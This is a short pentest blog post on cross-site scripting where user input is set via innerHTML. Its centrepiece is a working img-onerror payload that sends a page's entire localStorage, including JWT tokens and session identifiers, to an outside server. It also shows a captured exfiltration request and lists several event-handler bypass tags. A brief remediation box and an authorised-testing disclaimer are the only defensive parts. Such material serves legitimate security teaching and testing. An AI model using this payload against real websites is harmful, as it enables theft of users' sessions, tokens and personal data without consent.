---
layout: single
title: "XSS — Escaping innerHTML: Cookie Steal via img onerror"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - dom-xss
  - innerhtml
  - onerror-bypass
  - cookie-theft
  - localstorage
  - javascript
  - waf-bypass
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "When the injection point is inside innerHTML, script tags don't fire — but img onerror does. This one-liner exfiltrates localStorage without needing a script tag at all."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## The Problem with innerHTML

When a value is set via `element.innerHTML = userInput`, browsers refuse to execute `<script>` tags — they're parsed as HTML but not run. However, event handlers on other tags **do** fire.

## The Payload

```html
<img src="/" onerror='fetch("http://192.168.XX.XX/exfil?data=" + encodeURIComponent(JSON.stringify(localStorage)))'>
```

## How It Works

1. `src="/"` — the browser tries to load an image from the root path
2. That path returns the HTML page, not an image → triggers `onerror`
3. `onerror` fires the fetch, sending all localStorage contents to your server

No `<script>` tag. No external file. One attribute.

## Impact

<div class="tool-out">GET /exfil?data=%7B%22token%22%3A%22eyJhbGci...%22%7D HTTP/1.1</div>

All localStorage keys and values arrive in a single request. Common targets: JWT tokens, session identifiers, user preferences with PII.

## Other innerHTML Bypass Tags

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

<div class="remediation-box"><strong>Fix:</strong> Never set innerHTML with user-controlled data. Use <code>textContent</code> or <code>innerText</code> instead — these never parse HTML. Use DOMPurify if HTML rendering is required.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
